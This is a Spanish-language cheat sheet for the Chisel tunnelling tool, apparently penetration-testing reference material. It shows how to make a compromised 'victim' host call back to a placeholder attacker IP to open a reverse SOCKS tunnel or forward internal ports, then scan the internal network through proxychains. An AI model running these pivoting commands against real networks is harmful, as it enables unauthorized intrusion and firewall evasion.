# Chisel Cheat Sheet
> **Guía rápida de comandos para Chisel, una herramienta de túneles TCP y proxy SOCKS utilizada para pivoting y evasión de firewalls.**

---

## 🌐 1. Túnel SOCKS Inverso (Pivoting Completo)

Permite enrutar todo el tráfico de tu máquina atacante a través de la máquina víctima hacia la red interna.

### 💻 Paso 1: Iniciar el Servidor en tu Máquina Atacante
```bash
./chisel server -p 8000 --reverse
```

### 🪟 Paso 2: Iniciar el Cliente en la Máquina Víctima
* **Desde Linux (Víctima)**:
  ```bash
  ./chisel client <IP_ATACANTE>:8000 R:socks
  ```
* **Desde Windows (Víctima)**:
  ```cmd
  chisel.exe client <IP_ATACANTE>:8000 R:socks
  ```
  *(Por defecto, esto abrirá un proxy SOCKS5 local en tu máquina atacante en el puerto `1080`)*.

### ⚙️ Paso 3: Configurar Proxychains (Atacante)
Edita el archivo `/etc/proxychains4.conf` y añade la siguiente línea al final:
```ini
socks5 127.0.0.1 1080
```
* **Ejecutar cualquier herramienta a través del túnel**:
  ```bash
  proxychains nmap -p 22,80,445 -sT -Pn 192.168.2.10
  ```
  > [!WARNING]
  > Nmap a través de Proxychains solo soporta escaneos de conexión TCP completa (`-sT`). Los escaneos SYN (`-sS`) e ICMP (`-Pn` obligatorio) fallarán.

---

## 🔌 2. Reenvío de Puerto Específico Inverso (Reverse Port Forwarding)

Trae un puerto de un servicio interno inaccesible (ej. puerto 80 en la red local interna) y mapéalo localmente en tu máquina atacante.

* **Servidor (Atacante)**:
  ```bash
  ./chisel server -p 8000 --reverse
  ```
* **Cliente (Víctima - reenviar el puerto 80 de una IP interna hacia el puerto 8080 del atacante)**:
  ```bash
  ./chisel client <IP_ATACANTE>:8000 R:8080:192.168.2.10:80
  ```
  *(Ahora podrás acceder a la web interna abriendo tu navegador en `http://127.0.0.1:8080`)*.

---

## 🔗 3. Reenvío de Puerto Local (Local Port Forwarding)

Abre un puerto en la víctima que redirige al puerto del atacante.

* **Servidor (Víctima)**:
  ```bash
  ./chisel server -p 8000
  ```
* **Cliente (Atacante)**:
  ```bash
  ./chisel client <IP_VICTIMA>:8000 8080:127.0.0.1:80
  ```
